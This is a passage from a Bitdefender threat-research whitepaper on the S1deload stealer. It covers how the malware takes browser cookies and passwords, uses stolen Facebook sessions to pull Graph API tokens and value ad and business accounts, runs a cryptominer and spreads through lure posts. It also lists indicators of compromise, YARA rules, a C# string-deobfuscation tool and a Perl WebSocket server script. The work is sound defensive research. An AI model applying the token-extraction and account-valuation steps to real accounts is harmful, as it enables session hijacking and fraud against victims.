+The malware treats Facebook cookies on a different branch, they are extracted into a dictionary, where only the most 
+recent ones are kept based on Expiration timestamp.
+Saved password extraction
+Following cookie extraction, the stealer extracts saved passwords from the Login Data SQLite database, in a similar 
+manner as with cookies.
+Bitdefender Whitepaper
+S1deload Stealer – Exploring the Economics of Social Network Account Hijacking
+42
+The malware gathers the credentials (cookies or logins) in a list before exfiltrating them to the C2 server’s /api/logins/
+add endpoint.
+Establishing a Facebook account’s value
+If the user has a valid Facebook session, the malware queries Facebook’s Graph API to see how much influence the 
+account has.
+Bitdefender Whitepaper
+S1deload Stealer – Exploring the Economics of Social Network Account Hijacking
+43
+To achieve this goal, the malware needs an access token it can use to interact with Facebook’s Graph API. To obtain 
+the token the malware sends a request to https://business.facebook.com/business_locations, a legitimate Facebook 
+URL, while setting the Facebook cookies it extracted earlier.
+The response to this request will include the access token for Graph API, which the malware tries to find by searching 
+for “EEAG”.
+The malware extracts the tokens from DTSGInitialData and LSD fields.
+Bitdefender Whitepaper
+S1deload Stealer – Exploring the Economics of Social Network Account Hijacking
+44
+If the malware failed to extract the access token, it tries again with Facebook’s account billing URL. From the response 
+received, the malware tries to extract the access token found after the AdsCMConnectConfig field.
+Having a valid access token, it queries all Ad Accounts [7] associated to the user and parses the response.
+Bitdefender Whitepaper
+S1deload Stealer – Exploring the Economics of Social Network Account Hijacking
+45
+The malware stores the results in a list, and adds the default account with status -1.
+Knowing an account’s status is useful for the attacker, as they can burn their spamming campaign if it is associated 
+with an account that is suspended. account_status can take the following values [14]:
+1 = ACTIVE
+2 = DISABLED
+Bitdefender Whitepaper
+S1deload Stealer – Exploring the Economics of Social Network Account Hijacking
+46
+3 = UNSETTLED
+7 = PENDING_RISK_REVIEW
+8 = PENDING_SETTLEMENT
+9 = IN_GRACE_PERIOD
+100 = PENDING_CLOSURE
+101 = CLOSED
+201 = ANY_ACTIVE
+202 = ANY_CLOSED
+For each ad account ID, it queries the following values that indicate how Much Facebook trusts the account:
+•	
+adspaymentcycle (deprecated) [8]
+•	
+currency
+•	
+name
+•	
+adtrust_dsl
+•	
+amount_spent
+•	
+created_time
+The malware exfiltrates the received response along with account_status and the access token to the C2 server’s /
+api/google endpoint.
+Bitdefender Whitepaper
+S1deload Stealer – Exploring the Economics of Social Network Account Hijacking
+47
+We performed the same query on a test Facebook account to show what kind of information the threat actors can 
+access:
+Bitdefender Whitepaper
+S1deload Stealer – Exploring the Economics of Social Network Account Hijacking
+48
+Next up, the malware queries and exfiltrates the Pages [9] [10] associated with the user, their follower count and 
+verification_status to the /api/google2 endpoint. 
+Bitdefender Whitepaper
+S1deload Stealer – Exploring the Economics of Social Network Account Hijacking
+49
+Sample output with a test page, showcasing that the malware can determine whether the page is verified, and what 
+kind of permissions the account has over the Page.
+Bitdefender Whitepaper
+S1deload Stealer – Exploring the Economics of Social Network Account Hijacking
+50
+Next up, the malware queries each business associated with the user using Facebook’s Graph API:
+We created a test business account to see the kind of data that the malware sample would have access to and queried 
+the same endpoint as the malware:
+Bitdefender Whitepaper
+S1deload Stealer – Exploring the Economics of Social Network Account Hijacking
+51
+For each business, it queries adAccountLimit i.e. the number of Ad accounts that can be created under this 
+Business Manager account.
+Notice that the malware adds “BM” before the adAccountLimit number.
+BM stands for Business Manager. These kinds of accounts are rare and expensive due to the Facebook verification 
+process.
+Business Manager account for sale on accfarm[.]com for $40:
+Bitdefender Whitepaper
+S1deload Stealer – Exploring the Economics of Social Network Account Hijacking
+52
+Sample response for the querying for adAccountLimit:
+Finally exfiltrating the gathered data about the businesses to the C2 server’s /api/google3 endpoint:
+The final query is about the user: the malware interrogates Facebook’s Graph API of the groups they are administering. 
+The malware component exfiltrates the results to the /api/google4 endpoint of the C2 server. [11]
+Bitdefender Whitepaper
+S1deload Stealer – Exploring the Economics of Social Network Account Hijacking
+53
+In our testing, this API always returned an empty array even if the user was administering a group.
+According to documentation, this feature was removed. [12]
+After the malware finishes exfiltrating data from Chrome-based browsers, it performs nearly identical steps for Firefox:
+•	
+exfiltrates cookies
+Bitdefender Whitepaper
+S1deload Stealer – Exploring the Economics of Social Network Account Hijacking
+54
+•	
+exfiltrates saved logins
+•	
+performs same Facebook profile checks
+Miner (CNQMUTIL.dll) payload
+This payload is a cryptojacker. We found this payload and the archive containing it while hunting for samples similar to 
+the ones already presented. This assembly is loaded by App3.exe, a renamed digitally signed executable from Canon.
+The entry point for this DLL is the get method of the FolderPath property called by the digitally 
+signed executable.
+It reaches out to the C2 to receive mining instructions.
+Bitdefender Whitepaper
+S1deload Stealer – Exploring the Economics of Social Network Account Hijacking
+55
+It sends the video controller’s description to the C2 server and uses the response received to decide whether to start 
+mining.
+Launches miner.exe and sends its output to the C2 server, so the threat actor can monitor the mining progress.
+Bitdefender Whitepaper
+S1deload Stealer – Exploring the Economics of Social Network Account Hijacking
+56
+The miner .dll is contained in an archive named Beam.rar, where a miner.exe is also present. 
+Based on the analysis of this archive, we can see that miner.exe is miniZ. [13] 
+How profitable is mining for the malware author?
+Based on the logs in the archive, we can extract the user ID that the malware author uses and the pool server: 
+Combining the user id and the pool server, we can estimate how much the malware author earns from the mining.
+At the time of writing, 17 active miners are associated with this address, yielding ~202 BEAM monthly, $24 at the 
+current exchange rate.
+Bitdefender Whitepaper
+S1deload Stealer – Exploring the Economics of Social Network Account Hijacking
+57
+This is a small amount for the effort the malware author has to go through to infect machines. 
+It also explains why we found very few samples that perform mining: it is simply not worth the effort to push miners.
+Going full circle - convincing the user to download malware
+While hunting for similar archives to AlbumGirlSexy.zip we found a sample that served at hxxps://dl[.]micbig[.]top/
+SexyGirlAlbum[.]zip?random=abcde according to VT.
+A google search of the domain leads to the Facebook page named The Best moment.
+The recent posts on the Facebook page seem out of context and lure the user to click on the links with the promise of 
+adult content. 
+Bitdefender Whitepaper
+S1deload Stealer – Exploring the Economics of Social Network Account Hijacking
+58
+The post linking to micbig[.]top was removed from Facebook, but it is still available for inspection via the Google Cache:
+After navigating to the URL from the deleted Facebook post (hxxps://micbig[.]top/eokr1236) we are redirected to 
+Bitdefender Whitepaper
+S1deload Stealer – Exploring the Economics of Social Network Account Hijacking
+59
+hxxps://neuka.top/AlbumSexy.zip. After the Cloudflare verification, the .zip is downloaded.
+The zip’s contents are similar to the ones we have seen before. The main difference is that CloudFuze is sideloaded 
+with CloudFuzeUtility.dll instead of WD Sync. This shows that the malware author actively develops the malware 
+infection chain to avoid detection.
+The malware author can therefore create a feedback loop: the more PCs they can infect, the more they can spam on 
+Facebook, the more clicks they can generate to infect more PCs.
+Upview - the end product of the operation?
+While searching for other domains used by the malware author, shopproxy[.]live stood out, because it was one of the 
+oldest registered domains: it was registered on 2022-03-14.
+Searching for the domain on Google, we get hits on Facebook posts, similarly to the previous domain.
+Bitdefender Whitepaper
+S1deload Stealer – Exploring the Economics of Social Network Account Hijacking
+60
+The posts attempt to lure the user with adult content to click on the link and download the content being served there.
+Bitdefender Whitepaper
+S1deload Stealer – Exploring the Economics of Social Network Account Hijacking
+61
+Our initial assumption was that once we clicked the link, we would be prompted to download AlbumGirlSexy.zip, closing 
+the loop we saw previously.
+Instead of serving the expected .zip, the webpage redirects to hxxps://upview[.]us/, where a landing page advertises 
+that, for the right price, the user can buy YouTube views.
+Once we register, we see that two main services are offered:
+YouTube boosting
+Bitdefender Whitepaper
+S1deload Stealer – Exploring the Economics of Social Network Account Hijacking
+62
+Facebook boosting
+These are the same two services that the malware’s final payload targets.
+The domain is registered with the following contact information. The registrant’s contact information may be fake: the 
+last name The Viet seems like a nickname, and the organization’s name is a very generic Pay. The street name is the 
+name of a province in Vietnam. 
+Bitdefender Whitepaper
+S1deload Stealer – Exploring the Economics of Social Network Account Hijacking
+63
+Similarities between components
+The sideloaded .NET DLLs share similarities, even if they have different purposes.
+They share the persistence mechanism, the string decryption function, the registry utility functions and the helper 
+functions used for extracting zips.
+These similarities show that the codebase is developed by a single individual or small organization.
+Network infrastructure
+We observed multiple domains registered and used by the attacker, but some patterns emerged.
+Each of their servers is behind Cloudflare.
+Subdomains/endpoints serve the same purpose on different domains:
+subdomain / URL
+Purpose
+cdn.<domain>
+dl.<domain>
+Delivers static content, such as chrome64.zip or task that 
+should be executed
+<domain>/Canon/sparkle-windows.
+xml
+Used by loader to download C2 component
+<domain>/commonupdate
+Querying C2 for tasks to unpack and execute
+<domain>/api/task/update
+Updating the status of the task with the C2 i.e. when a new 
+task is executed
+Bitdefender Whitepaper
+S1deload Stealer – Exploring the Economics of Social Network Account Hijacking
+64
+ytb.<domain>:8080
+Websocket sending commands to extension used for youtube 
+view boosting.
+log.<domain>/api/logs6
+Used for logging exceptions occurring during bot execution
+cdn.<domain>/log.php 
+cdn.<domain>/lol3.php 
+cdn.<domain>/lolda.php
+Used by mining payload to obtain mining parameters
+<domain>/api/google 
+<domain>/api/google2 
+<domain>/api/google3 
+<domain>/api/google4 
+<domain>/api/logins/add
+Credential stealing component sends its output to these URLs
+Campaign distribution
+We observed more than 600 users affected by this malware in our telemetry.
+Below you can find the heatmap:
+Below you can find the Campaign evolution:
+Bitdefender Whitepaper
+S1deload Stealer – Exploring the Economics of Social Network Account Hijacking
+65
+Privacy Impact
+S1deload stealer has serious privacy implications for the victim infected with it. The malware exfiltrates the victim’s 
+saved credentials, including email, social media or even financial accounts. The threat actor can access these 
+accounts or sell them on the dark web. 
+With access to the victim’s accounts, threat actors can perform identity theft or blackmail the victim and threaten to 
+expose their private information on a public website if they do not comply.
+Bitdefender Whitepaper
+S1deload Stealer – Exploring the Economics of Social Network Account Hijacking
+66
+MITRE techniques breakdown
+Execution
+Persistence
+Defense Evasion
+Credential 
+Access
+Command 
+and Control
+Exfiltration
+Impact
+User 
+Execution: 
+Malicious 
+File
+Hijack 
+Execution 
+Flow: DLL 
+Side-Loading
+Deobfuscate/Decode 
+Files or Information
+Credentials 
+from 
+Password 
+Stores: 
+Credentials 
+from Web 
+Browsers
+Application 
+Layer 
+Protocol: 
+Web 
+Protocols
+Exfiltration 
+Over C2 
+Channel
+Resource 
+Hijacking
+Native API
+Boot or 
+Logon 
+Autostart 
+Execution: 
+Registry 
+Run Keys 
+/ Startup 
+Folder
+Hide Artifacts: Hidden 
+Files and Directories
+Steal Web 
+Session 
+Cookie
+Hide Artifacts: Hidden 
+Window
+Hijack Execution Flow: 
+DLL Side-Loading
+Masquerading: Match 
+Legitimate Name or 
+Location
+How does Bitdefender defend against the 
+campaign?
+For our testing, we installed the latest version of BEST in a virtual machine. We chose the first archive from the Lure 
+archives section as the test payload. We extracted the archive and double clicked on AlbumGirlSexy.exe as a victim 
+would.
+Protection
+Initially, we set BEST’s policies to block threats as soon as possible.
+The Dropper was detected by Anti-Malware engines as soon as AlbumGirlSexy.exe was executed, stopping the attack in 
+its tracks.
+Bitdefender Whitepaper
+S1deload Stealer – Exploring the Economics of Social Network Account Hijacking
+67
+Detection
+To test the detection and visibility of our product throughout the entire infection chain, we adjusted BEST’s policies to 
+not block malicious processes, only report them to the console.
+Bitdefender detects each process presented in the infection chain, alongside their .dlls.
+Bitdefender Whitepaper
+S1deload Stealer – Exploring the Economics of Social Network Account Hijacking
+68
+The graph view allows a system administrator or SOC analyst to view detailed information about the infection, such as 
+the registry keys used for persistence or the URL of the C2 server.
+Bitdefender Whitepaper
+S1deload Stealer – Exploring the Economics of Social Network Account Hijacking
+69
+Bitdefender Whitepaper
+S1deload Stealer – Exploring the Economics of Social Network Account Hijacking
+70
+Conclusion
+In this article, we presented S1deload stealer, which infects victims’ PCs, steals users’ credentials, and uses the PCs as 
+bots for farming YouTube views, spamming on Facebook pages and cryptojacking. 
+The malware sideloads its components into legitimate applications throughout the infection chain to avoid detection 
+by AVs. After establishing communication with the C2 server, the malware can take control of the machine, as it can 
+download and execute additional components. 
+The stealer component we observed in the wild steals the saved credentials from the victim’s browser, exfiltrating them 
+to the malware author’s server. The malware author uses the newly obtained credentials to spam on social media and 
+infect more machines, creating a feedback loop.
+The malware author monetizes the machines it controls by selling YouTube and Facebook boosting services. The 
+Chrome controller component starts a hidden browser on the victim’s machine and instructs it to repeatedly play 
+YouTube videos.
+To defend against this threat, only execute software that originates from a trusted source, and keep your antivirus up to 
+date.
+Bitdefender Whitepaper
+S1deload Stealer – Exploring the Economics of Social Network Account Hijacking
+71
+References
+[1] https://businessinsights.bitdefender.com/tech-explainer-what-is-dll-sideloading 
+[2] https://learn.microsoft.com/en-us/windows/win32/inputdev/wm-lbuttondown 
+[3] https://learn.microsoft.com/en-us/windows/win32/inputdev/wm-lbuttonup
+[4] https://learn.microsoft.com/en-us/windows/win32/inputdev/wm-mousemove 
+[5] https://support.google.com/youtube/answer/3399767?hl=en 
+[6] https://learn.microsoft.com/en-us/dotnet/api/system.security.cryptography.protecteddata.unprotect?view=dotnet-
+plat-ext-7.0 
+[7] https://developers.facebook.com/docs/marketing-api/business-asset-management/guides/ad-accounts
+[8] https://developers.facebook.com/docs/graph-api/changelog/version3.0/ 
+[9] https://developers.facebook.com/docs/graph-api/reference/user/accounts/ 
+[10] https://developers.facebook.com/docs/graph-api/reference/page/ 
+[11] https://developers.facebook.com/docs/graph-api/reference/v15.0/group 
+[12] https://developers.facebook.com/docs/graph-api/reference/v15.0/user/groups 
+[13] https://miniz.ch/
+[14] https://www.blackhatworld.com/seo/why-your-fb-account-is-banned-api-check.1246056/ 
+Bitdefender Whitepaper
+S1deload Stealer – Exploring the Economics of Social Network Account Hijacking
+72
+Indicators of Compromise
+Hashes
+Lure archives
+78cbd99e68bf630bb57e5207c3aa830729f8a6c882ab194bd16a87fdf79e4483 
+e593682d3bebfec43accfe51f7760cc3b70dd774ae5f63dc9aa51c86ba4f8044 
+d047c3c62eebdd959eff8cb83bccb19f5579c47141d87948ce018afa119e7013 
+4db454a99ece9b30c29e12b245e76726b824a05f023ce73527be3cb5c1e1ba3a
+Dropper
+4899ec50e71a1a7a1e45b805382fc59dc2ff7dcb164a898bab85d30ca83256cf
+Loader
+a4d03e64906d46d6966c2fefe84c5e0bf9c85f12137a1bcf45639941b68e90da
+C2 communication module
+e7987a21897de6f41b58c06ef64f85acfd1c6cc78eb01ad3d8963839c70cb10e
+Chrome controller
+2799c2a302164626c77dd73bf755981be3ff159cc0d2e85c1c54b620fd815132
+Stealer
+f0f37a2f0c07538a2382f52c540d41077f98c5acf6d6e029260a488bcf165688
+Miner archive
+ed2c61f801516e0d357541048b980e074068a7ebe8cc3393c6f3ea1115e1201c
+Miner
+6e6c590f10504eec5f426f86630f1b9dd73a5e5990a4bd4bc4371591c478fdd6
+Domain names
+appfree.club
+dolala.xyz
+micbig.top
+mictobig.xyz
+napala.top
+neuka.top
+Bitdefender Whitepaper
+S1deload Stealer – Exploring the Economics of Social Network Account Hijacking
+73
+neukoo.top
+shopproxy.live
+papazz.xyz
+poloke.top
+programe.top
+progriu.top
+puname.top
+ubutun.xyz
+Yara rules
+import “pe”
+rule S1deloadStealer_Registry
+{
+    meta:
+        author = “Acs David - Bitdefender”
+        date = “2022-12-05”
+        hash = “2799C2A302164626C77DD73BF755981BE3FF159CC0D2E85C1C54B620FD815132”
+    strings:
+        $reg_util_namespace = “RegistryUtils”
+        $reg_util_get_registry_value = “GetRegistryValue”
+        $reg_util_set_registry_value = “SetRegistryValue”
+        $set_persistence_instructions = { 28 [6-8] 2C [2-3] 74 [6-8] 16 91 18 2E ?? 
+1F 0C 8D [6-8] 16 18 9C [2-4] 20 [4] 28 [4] 20 [4] 28 [4] 11 ?? 19 17 28 }
+    condition:
+        pe.is_pe
+        and filesize <= 1MB
+        and pe.imports(“mscoree.dll”)
+        and (all of them)
+}
+rule S1deloadStealer_ID_generation
+{
+    meta:
+        author = “Acs David - Bitdefender”
+        date = “2022-12-05”
+        hash = “F0F37A2F0C07538A2382F52C540D41077F98C5ACF6D6E029260A488BCF165688”
+    strings:
+        $get_msuuid = “getMSUUID”
+        $id_generation_code = { 1F 09 8D [4] 0? 0? 16 20 [4] 28 [4] A2 0? 17 28 [4] 
+A2 0? 18 20 [4] 28 [4] A2 0? 19 28 [4] A2 0? 1A 20 [4] 28 [4] A2 0? 1B 28 [4] A2 0? 
+1C 28 [4] A2 0? 1D 20 [4] 28 [4] A2 0? 1E 28 [4] A2 0? 28 [4] 28 [4] 0B DE }
+Bitdefender Whitepaper
+S1deload Stealer – Exploring the Economics of Social Network Account Hijacking
+74
+    condition:
+        pe.is_pe
+        and filesize <= 1MB
+        and pe.imports(“mscoree.dll”)
+        and (any of them)
+}
+rule S1deloadStealer_PDB_path
+{
+    meta:
+        author = “Acs David - Bitdefender”
+        date = “2022-12-05”
+        hash = “”
+    condition:
+        pe.is_pe
+        and pe.pdb_path contains “C:\\Users\\KienTi\\Documents”
+        and filesize <= 1MB
+        and pe.imports(“mscoree.dll”)
+}
+Bitdefender Whitepaper
+S1deload Stealer – Exploring the Economics of Social Network Account Hijacking
+75
+Appendix A - String Decryption code
+using System;
+using System.Reflection;
+using System.Linq;
+using dnlib.DotNet;
+using dnlib.DotNet.Emit;
+using System.Collections.Generic;
+using dnlib.DotNet.Writer;
+namespace DecryptStrings
+{
+    class Decryptor
+    {
+        private ModuleDef module;
+        private Assembly assembly;
+        private string modulePath;
+        private string functionName;
+        public Decryptor(string ModulePath, string FunctionName)
+        {
+            module = ModuleDefMD.Load(ModulePath);
+            assembly = Assembly.LoadFrom(ModulePath);
+            modulePath = ModulePath;
+            functionName = FunctionName;
+        }
+        public void Decrypt()
+        {
+            MethodDef decryptionMethod = FindDecryptionFunction();
+            Console.WriteLine($”Found decryption function with MD: {decryptionMeth-
+od.MDToken}”);
+            var typeQueue = new Queue<TypeDef>(module.Types.Where(t => t.HasMethods 
+&& !t.IsGlobalModuleType));
+            while(typeQueue.Count() > 0)
+            {
+                TypeDef type = typeQueue.Dequeue();
+                // decrypt strings in nested types as well.
+                foreach (var nestedType in type.GetTypes())
+                {
+                    if (nestedType.HasMethods)
+                    {
+                        typeQueue.Enqueue(nestedType);
+                    }
+                }
+                foreach (MethodDef method in type.Methods.Where(m => m.HasBody))
+                {
+                    DecryptStringsInMethod(method, decryptionMethod);
+                }
+            }
+        }
+Bitdefender Whitepaper
+S1deload Stealer – Exploring the Economics of Social Network Account Hijacking
+76
+        private MethodDef FindDecryptionFunction()
+        {
+            var list = new List<MethodDef>();
+            foreach (TypeDef type in module.Types.Where(t => t.HasMethods && !t.Is-
+GlobalModuleType))
+            {
+                foreach (MethodDef method in type.Methods.Where(m => m.HasBody))
+                {
+                    if (IsDecryptionFunction(method))
+                    {
+                        list.Add(method);
+                    }
+                }
+            }
+            if(list.Count() != 1)
+            {
+                throw new Exception($”found {list.Count()} decryption function in-
+stead of 1”);
+            }
+            return list.First();
+        }
+        private bool IsDecryptionFunction(MethodDef method)
+        {
+            if (string.IsNullOrEmpty(functionName))
+            {
+                // function name not given by user, try to find it using pattern 
+matching.
+                if (!method.IsStatic)
+                {
+                    return false;
+                }
+                if (method.GetParamCount() != 1)
+                {
+                    return false;
+                }
+                if (!method.HasReturnType)
+                {
+                    return false;
+                }
+                if (!method.ReturnType.FullName.Contains(“System.String”))
+                {
+                    // return value is not string
+                    return false;
+                }
+                return IsBodyMatchingDecryptionFunction(method.Body);
+            }
+            else
+            {
+Bitdefender Whitepaper
+S1deload Stealer – Exploring the Economics of Social Network Account Hijacking
+77
+                // function name given by user, use it.
+                return method.Name.Contains(functionName);
+            }
+        }
+        private bool IsBodyMatchingDecryptionFunction(CilBody body)
+        {
+            // perform pattern matching on body of function.
+            List<Instruction> instructions = body.Instructions.ToList();
+            bool hasCallVirt = false;
+            bool hasCallVirtTryGetValue = false;
+            bool hasCallInstruction = false;
+            int callInstructionIndex = 0;
+            for (int i = 0; i < instructions.Count(); i++)
+            {
+                Instruction currentInst = instructions[i];
+                if (currentInst.OpCode == OpCodes.Callvirt)
+                {
+                    if (hasCallVirt)
+                    {
+                        // there should be only one callvirt instruction in method 
+body.
+                        return false;
+                    }
+                    hasCallVirt = true;
+                    var method = (IMethod)currentInst.Operand;
+                    string methodString = method.ToString();
+                    if (methodString.Contains(“Dictionary”) && methodString.Con-
+tains(“TryGetValue”))
+                    {
+                        hasCallVirtTryGetValue = true;
+                    }
+                }
+                if (currentInst.OpCode == OpCodes.Call)
+                {
+                    var calledMethod = (IMethod)currentInst.Operand;
+                    string calledMethodString = calledMethod.ToString();
+                    if (calledMethodString.Contains(“System.Threading.Moni-
+tor::Enter”))
+                    {
+                        // ignore this call as they are used in implementation of 
+lock keyword.
+                        continue;
+                    }
+                    if (calledMethodString.Contains(“System.Threading.Monitor::Ex-
+it”))
+                    {
+                        // ignore this call as they are used in implementation of 
+lock keyword.
+                        continue;
+                    }
+Bitdefender Whitepaper
+S1deload Stealer – Exploring the Economics of Social Network Account Hijacking
+78
+                    if (hasCallInstruction)
+                    {
+                        // there should be only one call instruction in method 
+body. (besides lock calls).
+                        return false;
+                    }
+                    hasCallInstruction = true;
+                    callInstructionIndex = i;
+                }
+            }
+            // check for pushing true before calling function.
+            if (callInstructionIndex <= 0)
+            {
+                // call is first instruction
+                return false;
+            }
+            Instruction beforeCall = instructions[callInstructionIndex - 1];
+            if (beforeCall.OpCode != OpCodes.Ldc_I4_1)
+            {
+                return false;
+            }
+            return hasCallVirtTryGetValue && hasCallInstruction;
+        }
+        private void DecryptStringsInMethod(MethodDef Method, MethodDef Decryption-
+Method)
+        {
+            bool wereInstructionsModified = false;
+            IList<Instruction> instructions = Method.Body.Instructions.ToList();
+            for (int i = 0; i < instructions.Count; i++)
+            {
+                Instruction currentInstruction = instructions[i];
+                if (currentInstruction.OpCode != OpCodes.Call)
+                {
+                    continue;
+                }
+                IMethod calledMethod = (IMethod)currentInstruction.Operand;
+                if (!calledMethod.MDToken.Equals(DecryptionMethod.MDToken))
+                {
+                    continue;
+                }
+                // current instruction is a call to the string decryption function.
+                if (calledMethod.GetParamCount() != 1)
+                {
+                    throw new Exception(“We currently handle decryption functions 
+with a single param!”);
+                }
+                // get previous instruction, should be a ldc.i4
+Bitdefender Whitepaper
+S1deload Stealer – Exploring the Economics of Social Network Account Hijacking
+79
+                Instruction prevInstruction = instructions[i - 1];
+                if (!prevInstruction.IsLdcI4())
+                {
+                    Console.WriteLine($”[WARNING] skipping Decryption function 
+call, as it has invalid arg (prev instruction)!, while processing: {Method.Full-
+Name} MD: {Method.MDToken}”);
+                    continue;
+                }
+                int stringId = prevInstruction.GetLdcI4Value();
+                MethodBase methodBase = assembly.ManifestModule.ResolveMethod(-
+calledMethod.MDToken.ToInt32());
+                // call the method
+                string decryptedString = (string)methodBase.Invoke(null, new ob-
+ject[] { stringId });
+                // replace the call instruction with a load string.
+                instructions[i] = OpCodes.Ldstr.ToInstruction(decryptedString);
+                // nop out ldc.i4
+                prevInstruction.OpCode = OpCodes.Nop;
+                wereInstructionsModified = true;
+            }
+            
+            if (wereInstructionsModified)
+            {
+                // Console.WriteLine($”new body for: {Method.MDToken}”);
+                // overwrite method’s body with modified instruction, but keep ev-
+erything else intact.
+                CilBody body = Method.Body;
+                Method.Body = new CilBody(body.InitLocals, instructions, body.Ex-
+ceptionHandlers, body.Variables);
+            }
+        }
+        public void Save()
+        {
+            
+            var options = new ModuleWriterOptions(module);
+            options.MetadataOptions.Flags |= MetadataFlags.KeepOldMaxStack;
+            string decryptedPath = modulePath + “.decrypted”;
+            module.Write(decryptedPath, options);
+        }
+    }
+    class Program
+    {
+        static void Main(string[] args)
+        {
+            if (args.Length != 1 && args.Length != 2)
+            {
+                Console.WriteLine(“usage: <assemblyPath> [<functionName>]”);
+                return;
+            }
+            string functionName = null;
+Bitdefender Whitepaper
+S1deload Stealer – Exploring the Economics of Social Network Account Hijacking
+80
+            string assemblyPath = args[0];
+            if (args.Length > 1)
+            {
+                functionName = args[1];
+            }
+            Console.WriteLine($”decrypting: {assemblyPath}”);
+            Decryptor decryptor = new Decryptor(assemblyPath, functionName);
+            decryptor.Decrypt();
+            Console.WriteLine(“saving decrypted file to disk.”);
+            decryptor.Save();
+        }
+    }
+}
+Appendix B - Server-side perl script
+use strict;
+use warnings;
+use utf8;
+use AnyEvent::Handle;
+use Plack::Builder;
+use Protocol::WebSocket::Frame;
+use Protocol::WebSocket::Handshake::Server;
+my %channel;
+my @message;
+builder {
+    mount ‘/websocket’ => sub {
+        my $env = shift;
+        my $fh = $env->{‘psgix.io’} or return [500, [], []];
+        my $hs = Protocol::WebSocket::Handshake::Server->new_from_psgi($env);
+        $hs->parse($fh) or return [500, [], [$hs->error]];
+        my $code = sub {
+            my ($handle, $message) = @_;
+            if (defined $handle and ref($handle) eq ‘AnyEvent::Handle’ and defined 
+$message) {
+                my $frame = Protocol::WebSocket::Frame->new(type => ‘text’, buffer 
+=> $message);
+                $handle->push_write($frame->to_bytes());
+            }
+        };
+        return sub {
+            my $respond = shift;
+            my $frame = Protocol::WebSocket::Frame->new(version => $hs->version);
+            my $h = AnyEvent::Handle->new(fh => $fh);
+Bitdefender Whitepaper
+S1deload Stealer – Exploring the Economics of Social Network Account Hijacking
+81
+            $channel{fileno($fh)} = $h;
+            $h->push_write($hs->to_string);
+            $code->($h, $_) for @message;
+            $h->on_read(sub {
+                $frame->append($_[0]->rbuf);
+                while (my $msg = $frame->next) {
+                    push @message, $msg;
+                    for (values %channel) {
+                        $code->($_, $msg);
+                    }
+                }
+            });
+            $h->on_error(sub {
+                warn “[ERROR]: @_”;
+                delete $channel{fileno($fh)};
+                $h->destroy;
+                undef $h;
+            });
+            $h->on_eof(sub {
+                delete $channel{fileno($fh)};
+                $h->destroy;
+                undef $h;
+            });
+        }
+    };
+};
+Bitdefender-PR-Whitepaper-S1deloadStealer-creat6669-en_EN
+02/10/23February 22, 2023 11:45 am02/22/23
+Founded 2001, Romania
+Number of employees 1800+ 
+Headquarters 
+Enterprise HQ – Santa Clara, CA, United States
+Technology HQ – Bucharest, Romania
+WORLDWIDE OFFICES
+USA & Canada: Ft. Lauderdale, FL | Santa Clara, CA | San Antonio, TX | 
+Toronto, CA
+Europe: Copenhagen, DENMARK | Paris, FRANCE | München, GERMANY | 
+Milan, ITALY | Bucharest, Iasi, Cluj, Timisoara, ROMANIA | Barcelona, SPAIN 
+| Dubai, UAE | London, UK | Hague, NETHERLANDS
+Australia: Sydney, Melbourne
+UNDER THE SIGN OF THE WOLF
+A trade of brilliance, data security is an industry where only the clearest view, sharpest mind and deepest insight can 
+win — a game with zero margin of error. Our job is to win every single time, one thousand times out of one thousand, 
+and one million times out of one million.
+And we do. We outsmart the industry not only by having the clearest view, the sharpest mind and the deepest insight, 
+but by staying one step ahead of everybody else, be they black hats or fellow security experts. The brilliance of our 
+collective mind is like a luminous Dragon-Wolf on your side, powered by engineered intuition, created to guard against 
+all dangers hidden in the arcane intricacies of the digital realm.
+This brilliance is our superpower and we put it at the core of all our game-changing products and solutions.
+About Bitdefender 
+Bitdefender is a cybersecurity leader delivering best-in-class threat 
+prevention, detection, and response solutions worldwide. Guardian 
+over millions of consumer, business, and government environments, 
+Bitdefender is one of the industry’s most trusted experts for 
+eliminating threats, protecting privacy and data, and enabling cyber 
+resilience. With deep investments in research and development, 
+Bitdefender Labs discovers over 400 new threats each minute and 
+validates around 40 billion daily threat queries. The company has 
+pioneered breakthrough innovations in antimalware, IoT security, 
+behavioral analytics, and artificial intelligence, and its technology is 
+licensed by more than 150 of the world’s most recognized technology 
+brands. Launched in 2001, Bitdefender has customers in 170+ 
+countries with offices around the world.
+For more information, visit https://www.bitdefender.com.   
+All Rights Reserved. © 2022 Bitdefender.  
+All trademarks, trade names, and products referenced herein are the property of their respective owners.
